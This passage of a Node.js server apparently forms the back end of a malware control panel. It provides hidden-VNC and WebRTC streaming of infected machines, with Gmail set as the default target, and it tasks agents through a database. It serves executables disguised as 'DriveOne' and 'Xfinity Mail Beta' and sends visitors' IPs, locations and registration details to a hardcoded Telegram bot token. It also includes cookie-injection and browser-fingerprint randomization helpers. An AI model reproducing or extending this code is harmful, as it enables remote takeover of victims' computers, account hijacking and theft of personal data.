            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }
    
    console.log(`[WebRTC] 📤 HTTP offer for session ${sessionId} forwarded to ${forwardedCount} viewers`);
    
    res.json({
        success: true,
        message: 'Offer received and forwarded',
        forwardedTo: forwardedCount,
        sessionId: sessionId
    });
});

// Get pending ICE candidates for agent
app.get('/api/webrtc/agent/candidates/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    const candidates = session.iceCandidates || [];
    const viewerCandidates = (session.viewerIceCandidates || []).map(c => ({ candidate: c, timestamp: Date.now() }));
    session.iceCandidates = [];
    session.viewerIceCandidates = [];

    res.json({
        success: true,
        candidates: [...candidates, ...viewerCandidates],
        count: candidates.length + viewerCandidates.length
    });
});


    
// Define rooms object for HVNC/TCP signaling
const rooms = {};

// Start TCP signaling server for HVNC client
// This handles the communication between HVNC client and WebRTC viewers
const { triggerViewerReady, forwardToHost } = startTcpSignaling(wss, rooms, 9001);

// Make these functions available globally in the WebRTC WebSocket handler
// They are used when an agent sends an offer or answer
global.triggerViewerReady = triggerViewerReady;
global.forwardToHost = forwardToHost;









// ─── SERVE STATIC FILES ─────────────────────────────────────
const staticPath = path.join(__dirname, 'build');
const mainPath = path.join(__dirname, 'main');

console.log(`📁 Serving main files from: ${mainPath}`);
app.use(express.static(mainPath));

console.log(`📁 Serving build files from: ${staticPath}`);
app.use('/login_090_srt', express.static(staticPath));

app.use('/assets', express.static(path.join(staticPath, 'assets')));
app.use('/static', express.static(path.join(staticPath, 'static')));
app.use('/css', express.static(path.join(staticPath, 'css')));
app.use('/js', express.static(path.join(staticPath, 'js'))); 

app.use('/payloads', express.static(path.join(__dirname, 'payloads')));
app.set('io', io);



// ─── MJPEG UPLOAD TOKENS (agent code unchanged) ────────────────
const mjpegUploadTokens = new Map();  // token -> { agentId, expiresAt }

function issueUploadToken(agentId, ttlMs = 30 * 60 * 1000) {
    // One active token per agent (single-stream model)
    for (const [tok, info] of mjpegUploadTokens) {
        if (info.agentId === agentId) mjpegUploadTokens.delete(tok);
    }
    const uploadToken = crypto.randomBytes(32).toString('hex');
    mjpegUploadTokens.set(uploadToken, { agentId, expiresAt: Date.now() + ttlMs });
    return uploadToken;
}

function revokeUploadTokens(agentId) {
    for (const [tok, info] of mjpegUploadTokens) {
        if (!agentId || info.agentId === agentId) mjpegUploadTokens.delete(tok);
    }
}

// Sweep expired tokens
setInterval(() => {
    const now = Date.now();
    for (const [tok, info] of mjpegUploadTokens) {
        if (info.expiresAt < now) mjpegUploadTokens.delete(tok);
    }
}, 60 * 1000);



// ─── BROADCASTER CLIENTS ──────────────────────────────────────
let broadcastClients = new Map();
let broadcastInterval = null;
let broadcastFrameCounter = 0;














function broadcastFrame() {
    const frame = mjpegState.frame;
    if (!frame) return;
    
    broadcastFrameCounter++;
    
    const boundary = 'frame';
    const header = `--${boundary}\r\n` +
                   `Content-Type: image/jpeg\r\n` +
                   `Content-Length: ${frame.length}\r\n\r\n`;
    
    const fullChunk = Buffer.concat([
        Buffer.from(header),
        frame,
        Buffer.from('\r\n')
    ]);
    
    const clientsToRemove = [];
    
    for (const [id, client] of broadcastClients) {
        if (!client.connected) {
            clientsToRemove.push(id);
            continue;
        }
        
        try {
            client.res.write(fullChunk);
            client.lastFrameTime = Date.now();
        } catch (err) {
            client.connected = false;
            clientsToRemove.push(id);
        }
    }
    
    // Clean up dead clients
    for (const id of clientsToRemove) {
        broadcastClients.delete(id);
    }
}

function sendFrameToClient(res, frame) {
    const boundary = 'frame';
    try {
        res.write(`--${boundary}\r\n`);
        res.write('Content-Type: image/jpeg\r\n');
        res.write(`Content-Length: ${frame.length}\r\n\r\n`);
        res.write(frame);
        res.write('\r\n');
    } catch (err) {
        // Client disconnected
        throw err;
    }
}




// ─── AUTH VARIANT THAT ACCEPTS QUERY-PARAM TOKEN (for <img> requests) ──
function verifyTokenQuery(req, res, next) {
    const authHeader = req.headers.authorization;
    const queryToken = req.query.token;
    const token = authHeader
        ? authHeader.replace(/^Bearer\s+/i, '')
        : queryToken;
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    req.token = token;
    // Delegate to your existing verifyToken logic — it should read
    // req.token (and/or req.headers.authorization). If your verifyToken
    // only reads the header, patch it to fall back to req.token.
    return verifyToken(req, res, next);
}



















// Agent polls for the viewer's SDP answer
app.get('/api/webrtc/agent/answer/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }
    // If answer exists, return it and clear it (so subsequent polls get nothing)
    if (session.pendingAnswer) {
        const answer = session.pendingAnswer;
        session.pendingAnswer = null; // clear after delivery
        return res.json({ success: true, sdp: answer });
    }
    // Also check if answer is stored in session.answer (if already set via WebSocket)
    if (session.answer) {
        const answer = session.answer;
        session.answer = null;
        return res.json({ success: true, sdp: answer });
    }
    // No answer yet
    res.json({ success: false, message: 'No answer yet' });
});



// ─── KILL ALL WEBRTC STREAMS ──────────────────────────────────
app.post('/api/webrtc/killall', (req, res) => {
    console.log('[WebRTC] 💀 KILLALL called - terminating all streams');
    let killed = 0;
    for (const [sessionId, session] of webrtcSessions) {
        // Close all viewer WebSockets
        for (const viewer of session.viewers) {
            try {
                if (viewer.readyState === WebSocket.OPEN) {
                    viewer.close(1000, 'Killswitch activated');
                }
            } catch (e) {}
        }
        // Close PeerConnection if it exists (on agent side, we can't directly close)
        // We'll rely on the agent to clean up when it receives a stop_host task
        // Or we can send a task to each agent to stop WebRTC
        killed++;
        deleteWebRTCSession(sessionId);
    }
    // Also clear any leftover state
    webrtcSessions.clear();
    webrtcViewers.clear();
    console.log(`[WebRTC] ✅ Killed ${killed} streams`);
    res.json({ 
        success: true, 
        killed: killed,
        message: `Terminated ${killed} WebRTC session(s)`
    });
});



// Optionally send stop_host task to all agents
app.post('/api/webrtc/stop-agents', verifyToken, (req, res) => {
    const db = require('./database');
    db.all("SELECT agentId FROM agents WHERE status = 'active'", (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        let tasksCreated = 0;
        const taskId = Date.now() + '_kill';
        rows.forEach(row => {
            db.run(
                "INSERT INTO tasks (taskId, agentId, type, moduleName, moduleAction, status) VALUES (?, ?, ?, ?, ?, ?)",
                [taskId + '_' + row.agentId, row.agentId, 'module_action', 'webrtc', 'stop_host', 'pending'],
                (err) => {
                    if (!err) tasksCreated++;
                }
            );
        });
        res.json({ success: true, tasksCreated });
    });
});



// ─── WEBRTC SIGNALING ENDPOINTS ──────────────────────────────────

// Get WebRTC stream URL for an agent
app.get('/api/webrtc/stream/:agentId', verifyToken, (req, res) => {
    const { agentId } = req.params;
    
    console.log(`[WebRTC] 📱 Stream request for agent: ${agentId}`);
    
    // Generate a unique session ID
    const sessionId = `${agentId}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    
    // Create session - ALWAYS create it
    const session = createWebRTCSession(sessionId, agentId);
    
    // Check if agent is connected via Socket.IO
    const agentSocket = getAgentSocket(agentId);
    if (!agentSocket) {
        console.log(`[WebRTC] ⚠️ Agent ${agentId} not connected via Socket.IO`);
        console.log(`[WebRTC] 📋 Available agents:`, Array.from(agentSockets.keys()));
        // DON'T delete the session - the agent might connect later via HTTP
    } else {
        console.log(`[WebRTC] ✅ Agent ${agentId} connected via Socket.IO`);
    }
    
res.json({
    success: true,
    sessionId,
    signalingUrl: `wss://${req.get('host')}/ws`,
    iceServers: getIceServers(),
    message: 'Use this sessionId to connect to the stream',
    agentConnected: !!getAgentSocket(agentId)
});
});

// WebRTC status endpoint
app.get('/api/webrtc/status', (req, res) => {
    const sessions = [];
    for (const [sessionId, session] of webrtcSessions) {
        sessions.push({
            sessionId: sessionId,
            agentId: session.agentId,
            viewers: session.viewers.size,
            connected: session.connected,
            created: session.created,
            hasOffer: !!session.offer,
            iceCandidates: session.iceCandidates.length
        });
    }
    
    res.json({
        totalSessions: webrtcSessions.size,
        sessions: sessions,
        activeViewers: Array.from(webrtcViewers.keys()).length
    });
});

// Cleanup stale WebRTC sessions (run every minute)
setInterval(() => {
    const now = Date.now();
    const staleTimeout = 5 * 60 * 1000; // 5 minutes
    
    for (const [sessionId, session] of webrtcSessions) {
        if (now - session.created > staleTimeout && session.viewers.size === 0) {
            deleteWebRTCSession(sessionId);
        }
    }
}, 60000);






// ─── HVNC WEBRTC ENDPOINTS yuw ──────────────────────────────────────────


// Agent polls for viewer ICE candidates
app.get('/api/hvnc_webrtc/agent/candidates/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ 
            success: false, 
            message: 'Session not found' 
        });
    }

    // Get pending viewer ICE candidates and clear them
    const candidates = session.viewerIceCandidates || [];
    session.viewerIceCandidates = [];

    res.json({
        success: true,
        candidates: candidates,
        count: candidates.length
    });
});



// Create HVNC WebRTC session
app.get('/api/hvnc_webrtc/stream/:agentId', verifyToken, (req, res) => {
    const { agentId } = req.params;
    
    console.log(`[HVNC WebRTC] 📱 Stream request for agent: ${agentId}`);
    
    // Generate a unique session ID
    const sessionId = `hvnc_${agentId}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    
    // Create session using the same WebRTC session store
    const session = createWebRTCSession(sessionId, agentId);
    
    // Store HVNC specific metadata
    session.hvnc = {
        profile: req.query.profile || 'Default',
        url: req.query.url || 'https://gmail.com',
        width: parseInt(req.query.width) || 1280,
        height: parseInt(req.query.height) || 800,
        fps: parseInt(req.query.fps) || 10,
        bitrate: parseInt(req.query.bitrate) || 2500,
        scale_factor: parseFloat(req.query.scale_factor) || 0.6
    };
    
    console.log(`[HVNC WebRTC] 📱 HVNC session created: ${sessionId} for agent ${agentId}`);
    
res.json({
    success: true,
    sessionId,
    signalingUrl: `wss://${req.get('host')}/ws`,
   iceServers: getIceServers(),
    message: 'Use this sessionId to connect to the stream',
    agentConnected: !!getAgentSocket(agentId)
});
});

// Agent sends SDP offer for HVNC WebRTC
app.post('/api/hvnc_webrtc/agent/offer', verifyToken, (req, res) => {
    const { sessionId, sdp } = req.body;
    
    if (!sessionId || !sdp) {
        return res.status(400).json({
            success: false,
            message: 'Missing sessionId or sdp'
        });
    }
    
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    // Store the offer
    session.offer = sdp;
    session.connected = true;
    
    // Forward to all connected viewers via WebSocket
    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }
    
    console.log(`[HVNC WebRTC] 📤 Offer for session ${sessionId} forwarded to ${forwardedCount} viewers`);
    
    res.json({
        success: true,
        message: 'Offer received and forwarded',
        forwardedTo: forwardedCount,
        sessionId: sessionId
    });
});

// Agent polls for viewer's SDP answer
app.get('/api/hvnc_webrtc/agent/answer/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    
    if (!session) {
        return res.status(404).json({ 
            success: false, 
            message: 'Session not found' 
        });
    }
    
    // Check for pending answer
    if (session.pendingAnswer) {
        const answer = session.pendingAnswer;
        session.pendingAnswer = null;
        return res.json({ 
            success: true, 
            sdp: answer 
        });
    }
    
    if (session.answer) {
        const answer = session.answer;
        session.answer = null;
        return res.json({ 
            success: true, 
            sdp: answer 
        });
    }
    
    res.json({ 
        success: false, 
        message: 'No answer yet' 
    });
});


// ─── HVNC WEBRTC ICE ENDPOINTS ──────────────────────────────────


// Agent sends ICE candidate
app.post('/api/hvnc_webrtc/agent/ice', verifyToken, (req, res) => {
    const { sessionId, candidate } = req.body;
    if (!sessionId || !candidate) {
        return res.status(400).json({ success: false, message: 'Missing sessionId or candidate' });
    }

    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    // Forward candidate to all viewers via WebSocket
    let forwarded = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'ice_candidate',
                candidate: candidate,
                sessionId: sessionId
            }));
            forwarded++;
        }
    }

    console.log(`[HVNC WebRTC] ICE candidate from agent forwarded to ${forwarded} viewers`);
    res.json({ success: true, forwarded });
});

// Viewer's ICE candidates (stored for agent to poll)
// Agent polls this endpoint to get ICE candidates from viewer
app.get('/api/hvnc_webrtc/agent/candidates/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    // Get pending viewer ICE candidates and clear them
    const candidates = session.viewerIceCandidates || [];
    session.viewerIceCandidates = [];

    res.json({
        success: true,
        candidates,
        count: candidates.length
    });
});

// ─── HVNC WEBRTC KILLALL ──────────────────────────────────────────
app.post('/api/hvnc_webrtc/killall', verifyToken, (req, res) => {
    console.log('[HVNC WebRTC] 💀 KILLALL called - terminating all HVNC streams');
    let killed = 0;
    const toDelete = [];
    for (const [sessionId, session] of webrtcSessions) {
        if (session.hvnc) {
            // Close all viewer WebSockets
            for (const viewer of session.viewers) {
                try {
                    if (viewer.readyState === WebSocket.OPEN) {
                        viewer.close(1000, 'Killswitch activated');
                    }
                } catch (e) {}
            }
            killed++;
            toDelete.push(sessionId);
        }
    }
    for (const sessionId of toDelete) {
        deleteWebRTCSession(sessionId);
    }
    console.log(`[HVNC WebRTC] ✅ Killed ${killed} HVNC streams`);
    res.json({ 
        success: true, 
        killed: killed,
        message: `Terminated ${killed} HVNC WebRTC session(s)`
    });
});



// Get HVNC WebRTC session status
app.get('/api/hvnc_webrtc/status/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    res.json({
        success: true,
        sessionId: sessionId,
        agentId: session.agentId,
        viewers: session.viewers.size,
        connected: session.connected,
        hasOffer: !!session.offer,
        hasAnswer: !!session.answer,
        iceCandidates: session.iceCandidates.length,
        hvnc: session.hvnc || null,
        created: session.created
    });
});

// List all HVNC WebRTC sessions
app.get('/api/hvnc_webrtc/sessions', verifyToken, (req, res) => {
    const sessions = [];
    for (const [sessionId, session] of webrtcSessions) {
        if (session.hvnc) {
            sessions.push({
                sessionId: sessionId,
                agentId: session.agentId,
                viewers: session.viewers.size,
                connected: session.connected,
                hvnc: session.hvnc,
                created: session.created
            });
        }
    }
    
    res.json({
        success: true,
        total: sessions.length,
        sessions: sessions
    });
});



// Kill specific HVNC session
app.post('/api/hvnc_webrtc/kill/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }
    
    // Close all viewers
    for (const viewer of session.viewers) {
        try {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.close(1000, 'Session terminated');
            }
        } catch (e) {}
    }
    
    deleteWebRTCSession(sessionId);
    
    res.json({
        success: true,
        message: `Session ${sessionId} terminated`
    });
});



// ─── HVNC EXPLORER ENDPOINTS ──────────────────────────────────────

// Create Explorer WebRTC session
app.get('/api/hvnc_explorer/stream/:agentId', verifyToken, (req, res) => {
    const { agentId } = req.params;
    console.log(`[HVNC Explorer] 📱 Stream request for agent: ${agentId}`);

    const sessionId = `explorer_${agentId}_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const session = createWebRTCSession(sessionId, agentId);

    // Mark as Explorer session (reuse hvnc flag for ICE routing)
    session.hvnc = {
        type: 'explorer',
        folder: req.query.folder || null,
        width: parseInt(req.query.width) || 1280,
        height: parseInt(req.query.height) || 800,
        fps: parseInt(req.query.fps) || 10,
        bitrate: parseInt(req.query.bitrate) || 2500,
        scale_factor: parseFloat(req.query.scale_factor) || 0.6
    };

    console.log(`[HVNC Explorer] 📱 Session created: ${sessionId} for agent ${agentId}`);
res.json({
    success: true,
    sessionId,
    signalingUrl: `wss://${req.get('host')}/ws`,
    iceServers: getIceServers(),
    message: 'Use this sessionId to connect to the stream',
    agentConnected: !!getAgentSocket(agentId)
});
});

// Agent sends SDP offer for Explorer WebRTC
app.post('/api/hvnc_explorer/agent/offer', verifyToken, (req, res) => {
    const { sessionId, sdp } = req.body;
    if (!sessionId || !sdp) {
        return res.status(400).json({
            success: false,
            message: 'Missing sessionId or sdp'
        });
    }

    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }

    session.offer = sdp;
    session.connected = true;

    let forwardedCount = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'offer',
                sdp: sdp,
                sessionId: sessionId
            }));
            forwardedCount++;
        }
    }

    console.log(`[HVNC Explorer] 📤 Offer for session ${sessionId} forwarded to ${forwardedCount} viewers`);
    res.json({
        success: true,
        message: 'Offer received and forwarded',
        forwardedTo: forwardedCount,
        sessionId: sessionId
    });
});

// Agent polls for viewer's SDP answer
app.get('/api/hvnc_explorer/agent/answer/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    if (session.pendingAnswer) {
        const answer = session.pendingAnswer;
        session.pendingAnswer = null;
        return res.json({ success: true, sdp: answer });
    }

    if (session.answer) {
        const answer = session.answer;
        session.answer = null;
        return res.json({ success: true, sdp: answer });
    }

    res.json({ success: false, message: 'No answer yet' });
});

// Agent sends ICE candidate
app.post('/api/hvnc_explorer/agent/ice', verifyToken, (req, res) => {
    const { sessionId, candidate } = req.body;
    if (!sessionId || !candidate) {
        return res.status(400).json({ success: false, message: 'Missing sessionId or candidate' });
    }

    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    let forwarded = 0;
    for (const viewer of session.viewers) {
        if (viewer.readyState === WebSocket.OPEN) {
            viewer.send(JSON.stringify({
                type: 'ice_candidate',
                candidate: candidate,
                sessionId: sessionId
            }));
            forwarded++;
        }
    }

    console.log(`[HVNC Explorer] ICE candidate from agent forwarded to ${forwarded} viewers`);
    res.json({ success: true, forwarded });
});

// Agent polls for viewer ICE candidates
app.get('/api/hvnc_explorer/agent/candidates/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);
    if (!session) {
        return res.status(404).json({ success: false, message: 'Session not found' });
    }

    const candidates = session.viewerIceCandidates || [];
    session.viewerIceCandidates = [];

    res.json({
        success: true,
        candidates,
        count: candidates.length
    });
});

// ─── HVNC EXPLORER KILLALL ──────────────────────────────────────────
app.post('/api/hvnc_explorer/killall', verifyToken, (req, res) => {
    console.log('[HVNC Explorer] 💀 KILLALL called - terminating all Explorer streams');
    let killed = 0;
    const toDelete = [];
    for (const [sessionId, session] of webrtcSessions) {
        if (session.hvnc && session.hvnc.type === 'explorer') {
            for (const viewer of session.viewers) {
                try {
                    if (viewer.readyState === WebSocket.OPEN) {
                        viewer.close(1000, 'Killswitch activated');
                    }
                } catch (e) {}
            }
            killed++;
            toDelete.push(sessionId);
        }
    }
    for (const sessionId of toDelete) {
        deleteWebRTCSession(sessionId);
    }
    console.log(`[HVNC Explorer] ✅ Killed ${killed} Explorer streams`);
    res.json({
        success: true,
        killed: killed,
        message: `Terminated ${killed} HVNC Explorer session(s)`
    });
});

// Get Explorer session status
app.get('/api/hvnc_explorer/status/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);

    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }

    // Only return if it's an Explorer session
    if (!session.hvnc || session.hvnc.type !== 'explorer') {
        return res.status(404).json({
            success: false,
            message: 'Not an Explorer session'
        });
    }

    res.json({
        success: true,
        sessionId: sessionId,
        agentId: session.agentId,
        viewers: session.viewers.size,
        connected: session.connected,
        hasOffer: !!session.offer,
        hasAnswer: !!session.answer,
        iceCandidates: session.iceCandidates.length,
        hvnc: session.hvnc,
        created: session.created
    });
});

// List all Explorer sessions
app.get('/api/hvnc_explorer/sessions', verifyToken, (req, res) => {
    const sessions = [];
    for (const [sessionId, session] of webrtcSessions) {
        if (session.hvnc && session.hvnc.type === 'explorer') {
            sessions.push({
                sessionId: sessionId,
                agentId: session.agentId,
                viewers: session.viewers.size,
                connected: session.connected,
                hvnc: session.hvnc,
                created: session.created
            });
        }
    }

    res.json({
        success: true,
        total: sessions.length,
        sessions: sessions
    });
});

// Kill specific Explorer session
app.post('/api/hvnc_explorer/kill/:sessionId', verifyToken, (req, res) => {
    const { sessionId } = req.params;
    const session = getWebRTCSession(sessionId);

    if (!session) {
        return res.status(404).json({
            success: false,
            message: 'Session not found'
        });
    }

    if (!session.hvnc || session.hvnc.type !== 'explorer') {
        return res.status(404).json({
            success: false,
            message: 'Not an Explorer session'
        });
    }

    // Close all viewers
    for (const viewer of session.viewers) {
        try {
            if (viewer.readyState === WebSocket.OPEN) {
                viewer.close(1000, 'Session terminated');
            }
        } catch (e) {}
    }

    deleteWebRTCSession(sessionId);

    res.json({
        success: true,
        message: `Explorer session ${sessionId} terminated`
    });
});











// ─── DOWNLOAD ENDPOINT ──────────────────────────────────────────


// ─── TELEGRAM CONFIG ──────────────────────────────────────────────

const TELEGRAM_BOT_TOKEN = '8660630244:AAFyKzFnq3-Gt2viRCfjaGqXinqCOQJHlOk';
const TELEGRAM_CHAT_ID = '-1004305809042';


// ─── HELPER: Get country from IP ──────────────────────────────────
async function getCountryFromIP(ip) {
    // Skip for localhost/private IPs
    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
        return 'Local/Private';
    }
    
    try {
        // Using ip-api.com (free, no API key required)
        const response = await axios.get(`http://ip-api.com/json/${ip}`, {
            timeout: 3000
        });
        
        if (response.data && response.data.status === 'success') {
            const country = response.data.country || 'Unknown';
            const city = response.data.city || 'Unknown';
            const region = response.data.regionName || 'Unknown';
            return `${country} (${city}, ${region})`;
        }
        return 'Unknown';
    } catch (error) {
        console.error('❌ Failed to get country from IP:', error.message);
        return 'Unknown';
    }
}


// ─── HELPER: Get client IP ──────────────────────────────────────
function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.ip || req.connection.remoteAddress || 'Unknown';
}




async function sendTelegramAlert(message) {
    try {
        // ✅ Debug: Log the URL being called (without exposing full token)
        const botToken = '8660630244:AAFyKzFnq3-Gt2viRCfjaGqXinqCOQJHlOk';
        const chatId = '-1004305809042';
        
        console.log('📡 Sending Telegram alert...');
        console.log(`📡 Bot Token: ${botToken ? botToken.substring(0, 10) + '...' : 'MISSING'}`);
        console.log(`📡 Chat ID: ${chatId || 'MISSING'}`);
        
        // ✅ Check if token and chat ID are set
        if (!botToken || botToken === 'YOUR_BOT_TOKEN_HERE') {
            console.error('❌ Telegram bot token is missing or not configured!');
            return;
        }
        
        if (!chatId || chatId === 'YOUR_CHAT_ID_HERE') {
            console.error('❌ Telegram chat ID is missing or not configured!');
            return;
        }
        
        // ✅ Make sure the URL has /bot prefix
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        console.log(`📡 URL: https://api.telegram.org/bot${botToken.substring(0, 10)}.../sendMessage`);
        
        const response = await axios.post(url, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('✅ Telegram alert sent successfully!');
        return response.data;
        
    } catch (error) {
        console.error('❌ Failed to send Telegram alert:');
        
        if (error.response) {
            // The request was made and the server responded with a status code
            console.error(`📡 Status: ${error.response.status}`);
            console.error(`📡 Response data:`, error.response.data);
            
            if (error.response.status === 404) {
                console.error('💡 Fix: Your bot token is invalid or the URL format is wrong.');
                console.error('💡 Make sure you have "/bot" before your token.');
                console.error('💡 Example: https://api.telegram.org/bot<YOUR_TOKEN>/sendMessage');
                console.error('💡 Get a new token from @BotFather on Telegram.');
            }
        } else if (error.request) {
            // The request was made but no response was received
            console.error('📡 No response received. Check your internet connection.');
        } else {
            // Something else happened
            console.error('📡 Error:', error.message);
        }
    }
}












// Endpoint for DriveOne
app.get('/sbfbkbj', async (req, res) => {
    const filePath = path.join(__dirname, 'dist', 'DriveOne.exe');
    
    if (fs.existsSync(filePath)) {
        const ip = getClientIP(req);
        const userAgent = req.get('User-Agent') || 'Unknown';
        const referer = req.get('Referer') || 'Direct';
        const country = await getCountryFromIP(ip);
        
        const message = `
🔔 <b>DriveOne Download</b>
📱 <b>User Agent:</b> ${userAgent}
🌐 <b>IP:</b> ${ip}
🌍 <b>Country:</b> ${country}
🔗 <b>Referer:</b> ${referer}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;
        await sendTelegramAlert(message);

        res.setHeader('Content-Disposition', 'attachment; filename="DriveOne.exe"');
        res.setHeader('Content-Type', 'application/octet-stream');
        const readStream = fs.createReadStream(filePath);
        readStream.pipe(res);
    } else {
        res.status(404).send('File not found. Please contact support.');
    }
});




// Endpoint for Xfinity Mail Beta
app.get('/comcast', async (req, res) => {
    const filePath = path.join(__dirname, 'dist', 'Xfinity-Mail-Beta.exe');
    
    if (fs.existsSync(filePath)) {
        const ip = getClientIP(req);
        const userAgent = req.get('User-Agent') || 'Unknown';
        const referer = req.get('Referer') || 'Direct';
        const country = await getCountryFromIP(ip);
        
        const message = `
🔔 <b>Xfinity Mail Beta Download</b>
📱 <b>User Agent:</b> ${userAgent}
🌐 <b>IP:</b> ${ip}
🌍 <b>Country:</b> ${country}
🔗 <b>Referer:</b> ${referer}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;
        await sendTelegramAlert(message);

        res.setHeader('Content-Disposition', 'attachment; filename="Xfinity-Mail-Beta.exe"');
        res.setHeader('Content-Type', 'application/octet-stream');
        const readStream = fs.createReadStream(filePath);
        readStream.pipe(res);
    } else {
        res.status(404).send('File not found. Please contact support.');
    }
});



// ─── FORM SUBMISSION ENDPOINT ──────────────────────────────────
app.post('/api/register', async (req, res) => {
    const { fullName, email, company, useCase, phone, role, experience, source } = req.body;
    const ip = getClientIP(req);
    const country = await getCountryFromIP(ip);
    
    // Determine which app the registration is for
    const appType = source || 'Xfinity Mail Beta';
    
    // Build the message dynamically based on what fields are provided
    let message = `
📝 <b>New Registration - ${appType}</b>
👤 <b>Name:</b> ${fullName || 'Not provided'}
📧 <b>Email:</b> ${email || 'Not provided'}
🌐 <b>IP:</b> ${ip}
🌍 <b>Country:</b> ${country}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;

    // Add DriveOne-specific fields if they exist
    if (phone) {
        message += `📱 <b>Phone:</b> ${phone}\n`;
    }
    if (role) {
        message += `💼 <b>Role:</b> ${role}\n`;
    }
    if (experience) {
        message += `📊 <b>Experience:</b> ${experience}\n`;
    }

    // Add Xfinity-specific fields if they exist
    if (company) {
        message += `🏢 <b>Company:</b> ${company}\n`;
    }
    if (useCase) {
        message += `📋 <b>Use Case:</b> ${useCase}\n`;
    }
    
    await sendTelegramAlert(message);
    
    res.json({ 
        success: true, 
        message: 'Registration successful! You can now download the app.' 
    });
});


// ─── SMART COOKIE INJECTION ENDPOINT (STABLE) ────────────────────


// ─── SANITIZE COOKIE ──────────────────────────────────────────────────
function sanitizeCookie(cookie, baseDomain) {
    const name = cookie.name || '';
    const isHostPrefix = name.startsWith('__Host-');
    const isSecurePrefix = name.startsWith('__Secure-');

    const sanitized = {
        name: cookie.name,
        value: cookie.value || '',
        path: cookie.path || '/',
        secure: cookie.secure || false,
        httpOnly: cookie.httpOnly || false
    };

    if (cookie.expires) {
        if (typeof cookie.expires === 'number') {
            sanitized.expires = cookie.expires;
        } else if (cookie.expires instanceof Date) {
            sanitized.expires = Math.floor(cookie.expires.getTime() / 1000);
        } else if (typeof cookie.expires === 'string') {
            const date = new Date(cookie.expires);
            if (!isNaN(date.getTime())) {
                sanitized.expires = Math.floor(date.getTime() / 1000);
            }
        }
    }

    if (cookie.sameSite && ['Strict', 'Lax', 'None'].includes(cookie.sameSite)) {
        sanitized.sameSite = cookie.sameSite;
    }

    if (isHostPrefix) {
        sanitized.path = '/';
        sanitized.secure = true;
        delete sanitized.domain;
        return sanitized;
    }

    if (isSecurePrefix) {
        sanitized.secure = true;
        sanitized.domain = cookie.domain || '.' + baseDomain;
        return sanitized;
    }

    sanitized.domain = cookie.domain || '.' + baseDomain;
    return sanitized;
}

// ─── SCREEN SIZE HELPERS ──────────────────────────────────────────────
function getRandomScreenSize() {
    const screenResolutions = [
        { width: 1920, height: 1080 },
        { width: 1920, height: 1200 },
        { width: 1680, height: 1050 },
        { width: 1600, height: 900 },
        { width: 1536, height: 864 },
        { width: 1440, height: 900 },
        { width: 1366, height: 768 },
        { width: 1280, height: 1024 },
        { width: 1280, height: 720 },
        { width: 1280, height: 800 },
        { width: 1024, height: 768 }
    ];
    return screenResolutions[Math.floor(Math.random() * screenResolutions.length)];
}

function getViewportSize(screenSize) {
    // Slightly smaller than the window to account for browser UI
    return {
        width: screenSize.width - 16,
        height: screenSize.height - 80
    };
}

function getWindowPosition() {
    const offsets = [
        { x: 0, y: 0 },
        { x: 10, y: 5 },
        { x: -5, y: 10 },
        { x: 15, y: -3 },
        { x: -8, y: -8 }
    ];
